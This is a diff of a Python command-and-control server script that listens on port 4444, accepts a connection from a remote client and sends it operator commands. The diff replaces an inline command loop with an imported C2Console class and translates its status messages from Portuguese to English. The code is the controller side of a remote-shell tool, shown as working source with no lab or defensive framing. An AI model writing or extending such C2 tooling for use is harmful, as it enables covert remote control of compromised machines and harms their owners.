@@ -1,26 +1,18 @@
 import socket
+from c2_console import C2Console
 
-HOST = '0.0.0.0'  # Interfaces em escuta (todas)
-PORT = 4444       # Porta do C2
+HOST = '0.0.0.0'
+PORT = 4444
 
 def start_server():
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.bind((HOST, PORT))
     server.listen(5)
-    print(f"[+] Servidor C2 ouvindo em {HOST}:{PORT}")
+    print(f"[+] Listening on {HOST}:{PORT}")
 
     client_socket, addr = server.accept()
-    print(f"[+] Conexão recebida de {addr[0]}:{addr[1]}")
-
-    while True:
-        command = input("C2> ")
-        if command.strip().lower() == "exit":
-            client_socket.send(b"exit")
-            break
-
-        client_socket.send(command.encode())
-        result = client_socket.recv(4096).decode()
-        print(result)
+    cli = C2Console(client_socket, addr)
+    cli.cmdloop()
 
     client_socket.close()
     server.close()
